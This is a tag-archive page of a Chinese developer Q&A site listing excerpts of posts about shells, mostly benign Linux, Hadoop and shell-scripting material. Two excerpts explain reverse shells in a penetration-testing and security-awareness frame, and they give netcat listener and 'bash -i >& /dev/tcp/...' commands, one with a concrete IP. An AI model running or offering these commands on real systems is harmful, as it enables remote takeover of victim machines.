<!doctype html>
<html lang="en-us">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <title>shell | 开发者问答集锦</title>
    <meta property="og:title" content="shell - 开发者问答集锦">
    <meta property="og:type" content="article">
        
        
    <meta name="Keywords" content="">
    <meta name="description" content="shell">
        
    <meta name="author" content="">
    <meta property="og:url" content="https://zaina.newban.cn/tags/shell/">
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href='/css/normalize.css'>
    <link rel="stylesheet" href='/css/style.css'>
    <link rel="alternate" type="application/rss+xml+xml" href="https://zaina.newban.cn/tags/shell/index.xml" title="开发者问答集锦" />
    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    
    
    
    
    
    
</head>


<body>
    <header id="header" class="clearfix">
    <div class="container">
        <div class="col-group">
            <div class="site-name ">
                
                    <a id="logo" href="https://zaina.newban.cn">
                        开发者问答集锦
                    </a>
                
                
            </div>
            <div>
                <nav id="nav-menu" class="clearfix">
                    <a class="" href="https://zaina.newban.cn">首页</a>
                    
                </nav>
            </div>
        </div>
    </div>
</header>

    <div id="body">
        <div class="container">
            <div class="col-group">

                <div class="col-8" id="main">
                    
<div class="res-cons">
    
    <h3 class="archive-title">
        包含标签
        <span class="keyword">shell</span>
        的文章
    </h3>
    

    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%87%E5%BF%98%E5%BD%95aix%E4%B8%BB%E6%9C%BA%E4%B8%8B%E7%94%A8shell%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99ftp%E4%BC%A0%E6%9F%90%E4%B8%AA%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0linux%E4%B8%BB%E6%9C%BA/">备忘录AIX主机下用SHELL脚本编写FTP传某个目录下的文件到LINUX主机</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%87%E5%BF%98%E5%BD%95aix%E4%B8%BB%E6%9C%BA%E4%B8%8B%E7%94%A8shell%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99ftp%E4%BC%A0%E6%9F%90%E4%B8%AA%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0linux%E4%B8%BB%E6%9C%BA/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%87%E7%94%A8shell%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88%E4%B9%8Bbutterflynginxhttps/">备用shell管理方案之butterflynginxhttps</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            安装butterfly+nginx https 1. 安装butterfly yum install python36 python36-pip python36-devel -y pip install butterfly pip install butterfly[themes] # If you want to use themes pip install butterfly[systemd] # If you want to use systemd butterfly  1.1 注册systemd服务
cd /etc/systemd/system curl -O https://raw.githubusercontent.com/paradoxxxzero/butterfly/master/butterfly.service curl -O https://raw.githubusercontent.com/paradoxxxzero/butterfly/master/butterfly.socket systemctl enable butterfly.socket systemctl start butterfly.socket  1.3 配置butterfly为非安全模式,我们使用nginx来提供https服务
使用sshd授权登录方式.
vim /etc/systemd/system/butterfly.service [Unit] Description=Butterfly Terminal Server [Service] ExecStart=/usr/local/bin/butterfly.server.py --unsecure --login --pam_profile=sshd  1.4 重新启动服务即可……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%87%E7%94%A8shell%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88%E4%B9%8Bbutterflynginxhttps/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%96%E5%A3%B3%E6%A8%A1%E5%BC%8Fshell/">外壳模式shell</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            《系统程序员成长计划》这本书中提到了外壳模式的概念。所谓的外壳模式的作用就是：不需要修改原来的应用程序，而控制它的输入和输出（即用户界面），同时应用程序也不知道外壳的存在。当然这样理解会比较麻烦，我们就举个简单的例子，比如已经存在一个应用程序，我们想给该应用程序增添一个新的用户界面，这里有两种选择：1. 根据该应用程序的内部实现重新编写一个用户界面，但是如果原来的应用程序的用户界面和内部实现没有很好的分离，那么在我们创建新的用户界面的时候就不可避免的会牵扯到旧的用户界面；2. 利用外壳模式，外壳模式需要一个前提条件：应用程序实现了基于终端的用户界面，即从标准输入中读取数据，向标准输出和标准错误输出显示结果。这时我们可以把标准输入、标准输出和标准错误输出重定向到管道上，向管道里写数据来模拟应用程序的输入和输出。这样就实现了外壳模式。
下面是一个实现自动输入的程序，通过对该程序的解析，在分析过程中会总结下该程序涉及的有关知识。
#include #include int main(int argc, char * argv[]) { int n = 0; printf(&quot;Input number: \n&quot;); fflush(stdout); scanf(&quot;%d&quot;, &amp;n); printf(&quot;Your input %d\n&quot;, n); return 0; } #include #include int main(int argc, char * argv[]) { int shell_to_app[2] = {0}; int app_to_shell[2] = {0}; pipe(shell_to_app); pipe(app_to_shell); if(fork() == 0) { close(shell_to_app[1]); close(app_to_shell[0]); dup2(shell_to_app[0], STDIN_FILENO); dup2(app_to_shell[1], STDOUT_FILENO); execl(&quot;./app.exe&quot;, &quot;./app.exe&quot;, NULL); } else { FILE * in = fdopen(app_to_shell[0], &quot;r&quot;); FILE * out = fdopen(shell_to_app[1], &quot;w&quot;); char message[256] = {0}; close(shell_to_app[0]); close(app_to_shell[1]); fgets(message, sizeof(message), in); printf(&quot;1: %s\n&quot;, message); fprintf(out, &quot;1234\n&quot;); fflush(out); fgets(message, sizeof(message), in); printf(&quot;2: %s\n&quot;, message); printf(&quot;2: %s\n&quot;, message); fclose(in); fclose(out); } return 0; }  第一个程序就是一个main函数，实现的是简单的输入输出。外壳模式的基本原理主要体现在了第二个程序中，这里面涉及了进程，管道，文件描述符，输入输出流,，execl等一系列的概念，稍后我们会进一步的总结。这里我们针对这个程序对外壳模式的基本原理进行分析。……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%96%E5%A3%B3%E6%A8%A1%E5%BC%8Fshell/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">多种姿势反弹shell</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。
0x01. Bash反弹 攻击者主机上执行监听：
nc -lvvp port  目标主机上执行：
bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1  简单解释下：
 bash -i 打开一个交互的bash &gt; &amp; 将标准错误输出重定向到标准输出 /dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口 0 &gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互  注：
/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。
linux shell下常用的文件描述符是：
1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；
2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；
3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。
另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。
其他版本：
方法二：
exec 0&amp;0 2&gt;&amp;0 0/dev/tcp/x.x.x.x/4444; sh &amp;196 2&gt;&amp;196 /bin/bash -i &gt; /dev/tcp/x.……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%B0%83%E7%94%A8chethzssh2connection%E6%89%A7%E8%A1%8Cshell%E4%BB%BB%E5%8A%A1%E6%97%B6%E6%9C%89%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%A2%E5%A4%B1%E6%83%85%E5%86%B5%E8%A7%A3%E5%86%B3/">多线程调用chethzssh2Connection执行shell任务时有的执行丢失情况解决</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            最近项目出现一个问题，在使用多线程调用开源ch.ethz.ssh2.Connection执行shell任务时有的任务没有执行，导致没有获取数据。
后来经过定位发现线程池同时间最大运行数设置的是15，而liunx默认是10，就导致了一部分任务的丢失。（现在记录下，供出现同样此问题的童鞋们一个参考）
解决：java里面线程池同时间执行的最大线程数，不能够大于liunx链接ssh最大数
使用root用户登录java工程安装的liunx机器
vi /etc/ssh/sshd_config
默认是#MaxStartups 10
可以改成 MaxStartups 40
改完后记得重启
service sshd restart……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%B0%83%E7%94%A8chethzssh2connection%E6%89%A7%E8%A1%8Cshell%E4%BB%BB%E5%8A%A1%E6%97%B6%E6%9C%89%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%A2%E5%A4%B1%E6%83%85%E5%86%B5%E8%A7%A3%E5%86%B3/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%A7%E5%AE%B6%E4%B8%80%E8%B5%B7%E5%AD%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/">大家一起学安全之反弹shell</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            最近在工作中发现，一线研发类的同学对基本的安全的知识缺乏必要的了解，进而产生出这样的一些想法（纯属想象。。。）：

 你看我的密码zhangsan!@#123, 密码字母，数字，特殊字符都有了，别人肯定猜不到… 天啊，密码要三个月必须改一次，是不是吃饱了没事干… 安全又搞事情了，这也不能访问，那也需要认证，心里默默飘过了一万个草泥马… 每次访问数据库，流程一大堆，我自己写个PHP后门挂上去，可以随时访问，方便多了… 数据都加密了，我还怎么愉快的抓包定位问题? 又是一万个草泥马… 这台机器反正外网访问不到，我可以为所欲为了，各种软件装起来… 这个工程的代码写的太优雅了，感觉也不太重要，放我自己github上吧… 卧槽，安全的产品这么贵，还就这么点功能，好像也用不着，能省就省点吧… 公司这几个安全人员平时看着事也不多，这次裁员要不就先拿他们开刀…  “未知攻，焉知防”， 后续准备通过一系列小的分享文章，以此来增强大家在安全方面的基本认知和日常工作中的安全意识，今天我们就从反弹shell说起。
什么是反弹shell
怎么获取到shell呢？比如，我们通过ssh访问机房的一台服务器（chicken)，然后有一个shell命令行的方式来操作这台服务器，那么就可以说我们拿到了chicken的shell。除了ssh之外，我们还可以通过telnet，vnc来达到一个远程登陆的效果。
透过现象看本质，Hacker想要控制chicken，二者之间必须有一个数据传输的通道（TCP/UDP)。ssh是chicken启动一个ssh Server，Hacker来连接。当然，我们也可以开发一个叫TMD Server服务，可以将hacker发上来的文本当做一个CMD执行，那么也就认为TMDServer具备远程登陆的功能。
总而言之，上述shell通道的建立，都是hacker主动连接chicken，那么如果chicken主要连接hacker实现的shell执行通道，就叫反弹shell

为什么要反弹shell
为什么要用反弹shell呢，简单来说就是正向不好搞，所以要反向搞。比如，hacker通过九牛二虎之力，在chicken上上传了一个小马。后面的情况可能是：
chichen在局域网中，没有外网地址，我连不上；
chicken有外网地址，但是经常变，我不能持续的控制它；
chicken前面有waf部署，对进来的request请求做了过滤，很难绕过；
那么我可以通过在hacker机器上启动一个tcpserver，让chicken主动来连接我，由此建立一个数据通道来执行shell。

借用一图说明下（侵删）
示例
ttygif ttyrecord
hacker（外网地址为39.98.87.76)上执行:

chicken行执行

然后此时在看hacker机器上的显示，已经成功拿到chicken的shell，可以在chicken上为所欲为了。

先详细解释下chicken上执行命令的含义，这条命令就可以叫做一条反弹shell。现在详细解释下这条命令的含义：
bash -i &gt;&amp; /dev/tcp/39.98.87.76&frasl;4100 0&gt;&amp;1
bash -i 表示启动一个交互式的shell;
&gt;&amp; 这个交互式shell的标准输出和标准错误输出，重定向到这socket上/dev/tcp/39.98.87.76/4100，也即发送到/dev/tcp/39.98.87.76/4100远端；
0&gt;&amp;1 标准输入重定向到标准输出上；
简而言之，就是启动一个交互式shell，这个交互式shell的输入来自hacker，输出也输出也到hacker上。

反弹shell的姿势
通过bash -i的是最简单的但也同时是最容易被识别的反弹shell，在没有任何防护的小chicken上执行是没有问题的。
但如果此时chicken有一定的防护能力，比如前面有个waf或者机器装有入侵检测系统，容易就被识别出来被拦截。
但对于一个有经验的hacker来讲，熟练运用各种撩人姿势是必备技能，举例说明：

尤其msf自动生成的一些webshell，即便是装配了一些大厂的入侵检测系统，也很难直接识别出来。
后续操作
chicken被拿到shell后，那么就可以通过chicken来探测跟它在同一网段上的其他机器，他们都部署了什么服务，这些服务是否存在已知的可利用的漏洞等等。或者种上点蠕虫病毒，让其在内网中传播，一只小chicken被感染了，一群chicken可能都会被攻陷下来。
总结
由此分析，我觉得至少改变几个初级的安全认知：
内网的机器并不绝对安全的，一样可以被拿到shell。
做网络隔离，哪怕是内网中的网络安全域，是有用的，不是闲的没事干的操作。
waf和入侵检测能够较大的提升攻击门槛。……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%A7%E5%AE%B6%E4%B8%80%E8%B5%B7%E5%AD%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%80%BB%E7%BB%933leetcode%E8%A7%A3%E9%A2%98%E6%80%BB%E8%A7%88%E7%AE%97%E6%B3%95%E5%89%91%E6%8C%87offersql%E5%A4%9A%E7%BA%BF%E7%A8%8Bshell/">大总结3leetcode解题总览算法剑指offerSQL多线程shell</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            3/22更新 剑指offer 题目链接
建议大部分题都会做，都能比较快速且准确的写出来。关于做题方式，我的建议是：一道一道刷即可，因为难度一般，不用系统的学习什么知识，遇到实在不会的就跳过即可。
我这里写了大概80%的题，剩下的题我个人感觉没什么意思或者很难说思路，就没有写了。
剑指offer：3-7：找出重复数字/二维递增数组查询/空格替换%20/返回顺序相反的链表数组/前序中序重建二叉树
剑指offer：8-11：栈模拟队列/斐波那契/上台阶/搜索旋转数组
剑指offer：12-17：矩阵是否包含字符串/（整数拆分）剪m段绳子最大乘积/快速幂/
剑指offer：18-21：删除链表节点/实现正则/判断是否是数字/奇偶排序
剑指offer：22-25：链表倒k节点/反转链表/合并链表
剑指offer：26-30：判断树子结构/二叉树镜像/二叉树是否对称/顺时针打印矩阵/min栈
剑指offer：31-32：判断栈序列/层序遍历/改版
剑指offer：33-37：判断二叉搜索树后序序列/打印二叉树sum路径/copy random/二叉树序列化反序列化
剑指offer：39-42：出现超一半的数/最小k个数/数据流中位数/最大子数组
剑指offer：45-48：贪心拼最小数/数字翻译为字母的方法数（dp）/向右向下的最优解（dp）/最长不重复子串（dp）
剑指offer：50-53：第一个出现一次/逆序对数量/找链表交点/在排序数组出现的次数（二分）/0-n-1范围未出现数字（二分，异或）
剑指offer：55-58：二叉树深度/判断平衡二叉树/和为s的两个数/翻转句子/部分反转句子
剑指offer：63-66：股票卖一次最大利润/不用/、判断、循环实现1+2+n/不用+-/求和/除自己之外的乘积
二分  二分查找也称折半查找（Binary Search），它是一种效率较高的查找方法，前提是数据结构必须先排好序，可以在数据规模的对数时间复杂度内完成查找。但是，二分查找要求线性表具有有随机访问的特点（例如数组），也要求线性表能够根据中间元素的特点推测它两侧元素的性质，以达到缩减问题规模的效果。
二分查找问题也是面试中经常考到的问题，虽然它的思想很简单，但写好二分查找算法并不是一件容易的事情。
 leetcode 33 搜索旋转排序数组 到处是细节的好题
leetcode34. 在排序数组中查找元素的第一个和最后一个位置
leetcode35 插入的位置
leetcode74. 搜索二维矩阵 ，你见过吗（leetcode240. 搜索二维矩阵 II）
leetcode69 x的平方根
leetcode162. 寻找峰值 变种二分见过吗
leetcode 222. 完全二叉树的节点个数
leetcode270. 最接近的二叉搜索树值
leetcode367. 有效的完全平方数
leetcode374. 猜数字大小
leetcode704. 二分查找
位运算  位操作（Bit Manipulation）是程序设计中对位模式或二进制数的一元和二元操作。在许多古老的微处理器上，位运算比加减运算略快，通常位运算比乘除法运算要快很多。在现代架构中，情况并非如此：位运算的运算速度通常与加法运算相同（仍然快于乘法运算）。
位操作包括：¬ 取反（NOT）、∩ 按位或（OR）、⊕ 按位异或（XOR）、∪ 按位与（AND）
移位：移位是一个二元运算符，用来将一个二进制数中的每一位全部都向一个方向移动指定位，溢出的部分将被舍弃，而空缺的部分填入一定的值。
移位又分为算术移位、逻辑移位
 leetcode52. N皇后 II 最强解法直接秒杀100%……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%80%BB%E7%BB%933leetcode%E8%A7%A3%E9%A2%98%E6%80%BB%E8%A7%88%E7%AE%97%E6%B3%95%E5%89%91%E6%8C%87offersql%E5%A4%9A%E7%BA%BF%E7%A8%8Bshell/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoopjdk%E5%AE%89%E8%A3%85hdfs%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAhdfs%E7%9A%84shell%E6%93%8D%E4%BD%9C/">大数据HadoopJDK安装HDFS伪分布式环境搭建HDFS的shell操作</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            ### 所有的内容都来源与 Hadoop 官方文档  一、Hadoop 伪分布式安装步骤 1）JDK安装  解压 ：tar -zxvf jdk-7u79-linux-x64.tar.gz -C ~/app
 添加到系统环境变量 ：
   ~/.bash_profile export JAVA_HOME=/home/hadoop/app/jdk1.7.0_79 export PATH=$TAVA_HOME/bin:$PATH   环境变量生效 ：source ~/bash_profile
 验证Java是否配置成功 ：java -v
  2）ssh安装  参考：远程连接SSH  二、HDFS伪分布式环境搭建 1）下载并解压hadoop  下载：cdh网站下载 解压：tar -zxvf hadoop-2.6.0-cdh5.7.0.tar.gz -C ~/app  2）修改 Hadoop 配置文件  在 hadoop_home/etc/hadoop 目录下修改 #### 配置 hadoop-env.sh 文件   配置：export JAVA_HOME=/home/hadoop/app/jdk1.7.0_79   配置 cor-site.……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoopjdk%E5%AE%89%E8%A3%85hdfs%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAhdfs%E7%9A%84shell%E6%93%8D%E4%BD%9C/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86shell%E5%AE%9A%E6%97%B6%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AE/">大数据Hadoop基础知识Shell定时采集数据</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            1. NameNode概述  NameNode是HDFS的核心 NameNode也称为Master NameNode仅存储HDFS的元数据 : 文件系统中所有文件的目录树 , 并跟踪整个集群的文件 NameNode不存储实际数据或数据集 , 数据本身实际存储在DataNode中 NameNode知道任何文件的快列表及其位置 NameNode并不持久化存储每个文件中各个块所在的datanode的位置信息 NameNode对于HDFS至关重要 , 当NameNode关闭 , HDFS/Hadoop集群无法访问 NameNode是Hadoop集群中的单点故障 NameNode所在的机器通常会配置大量内存(RAM)  
2. DataNode概述  DataNode负责将实际数据存储在HDFS中 DataNode也称为Slave NameNode和DataNode会保持不断通信 DataNode启动时 , 它将自己发布到NameNode并汇报自己持有的块列表 当某个DataNode关闭时 , 不会影响数据或集群的可用性 , NameNode将安排由其他DataNode管理的块进行副本复制. DataNode所在的机器通常配置有大量的硬盘空间 , 故实际数据存储在其中 DataNode会定期（dfs.heartbeat.interval 配置项配置，默认是 3 秒）向NameNode 发送心跳，如果 NameNode 长时间没有接受到 DataNode 发送的心跳， NameNode 就会认为该 DataNode 失效。 block 汇报时间间隔取参数dfs.blockreport.intervalMsec,参数未配置的话默认为 6 小时.  Q:nn如何保证自己记录的元数据跟dn实际存储的信息是一致的。
 定时汇报机制  datanodes在启动的时候首先汇报一次自己持有的块信息 后续每隔一段时间 再次发生块的信息 默认是每隔6小时汇报一次  心跳机制  datanodes在启动的时候向nn注册自己 后续每隔3秒发送心跳信息 报活   3.……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86shell%E5%AE%9A%E6%97%B6%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AE/">阅读全文</a></p>
        </div>
    </article>
    
    <article class="post">
        <header>
            <h1 class="post-title">
                <a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%95%B0%E6%8D%AEshell%E5%9F%BA%E7%A1%80/">大数据Shell基础</a>
            </h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        <div class="post-content">
            前言  大数据 基础概念 大数据 Centos基础 大数据 Shell基础 大数据 ZooKeeper 大数据 Hadoop介绍、配置与使用 大数据 Hadoop之HDFS 大数据 MapReduce 大数据 Hive 大数据 Yarn 大数据 MapReduce使用 大数据 Hadoop高可用HA  介绍  Shell 是用来解决什么问题的？ - 伟哥-Wayne的回答 - 知乎
Linux的命令行接口归结起来就是各种Shell，那么到底什么是Shell？
Shell就是一个命令行解释器，它的作用是解释执行用户的命令，用户输入一条命令，Shell就解释执行一条，这种方式称为交互式(Interactive)。
Shell，译为外壳，是用户直接连入计算机所使用的计算机程序，负责解析用户提供的命令，如词法分析、语法分析、句法分析。
 完整教程  Shell 教程  Shell执行方式  ./test.sh sh test.sh source test.sh  方式1和方式2其实是一样的，都是在当前父进程下的子进程中执行，子进程执行结束之后，子进程中的变量和操作将会结束而且不会传回到父进程中。
换句话说， 方式1和方式2是作用于子进程本身，方式3则作用于整个父进程 。
Shell变量 查看系统变量可以使用set命令查看。
变量的声明采用的是变量名=值的方式定义，而且等号的左右不能有空格，否则报错，变量名称一般习惯采用大写。
在定义变量的时候，双引号是允许格式化字符串，比如Hello World！$USERNAME输出结果为Hello World！Linux。而单引号禁止格式化字符串，即Hello World！$USERNAME输出结果为Hello World！$USERNAME。
 双引号的优点：  双引号里可以出现转义字符 双引号里可以有变量  单引号的限制：  单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的； 单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。   系统变量可以使用unset 变量名撤销。……
            <p class="readmore"><a href="https://zaina.newban.cn/posts/%E5%A4%A7%E6%95%B0%E6%8D%AEshell%E5%9F%BA%E7%A1%80/">阅读全文</a></p>
        </div>
    </article>
    

    



<ol class="page-navigator">
    
    <li class="prev">
        <a href="https://zaina.newban.cn/tags/shell/page/1432/">上一页</a>
    </li>
    

    

    
        
        
    
    

    
        
        
        <li >
            <a href="https://zaina.newban.cn/tags/shell/">1</a>
        </li>
        
    
        
        <li>
            <span>...</span>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/tags/shell/page/1431/">1431</a>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/tags/shell/page/1432/">1432</a>
        </li>
        
    
        
        
        <li  class="current">
            <a href="https://zaina.newban.cn/tags/shell/page/1433/">1433</a>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/tags/shell/page/1434/">1434</a>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/tags/shell/page/1435/">1435</a>
        </li>
        
    
        
        <li>
            <span>...</span>
        </li>
        
    
        
        
        <li >
            <a href="https://zaina.newban.cn/tags/shell/page/1621/">1621</a>
        </li>
        
    

    
    

    <li class="next">
        <a href="https://zaina.newban.cn/tags/shell/page/1434/">下一页</a>
    </li>
    
</ol>




</div>

                    <footer id="footer">
    <div>
        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
        
    </div>
    <br />
    <div>
        <div class="github-badge">
            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
        </div>
        <div class="github-badge">
            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
        </div>
        <div class="github-badge">
            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
        </div>
    </div>
</footer>



<a id="rocket" href="#top"></a>
<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>



    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>




                </div>

                <div id="secondary">
    <section class="widget">
        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
      
      <input type="text" name="q" maxlength="20" placeholder="Search">
      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
      <button type="submit" class="submit icon-search"></button>
</form>
    </section>
    
    <section class="widget">
        <h3 class="widget-title">最近文章</h3>
<ul class="widget-list">
    
    <li>
        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
    </li>
    
    <li>
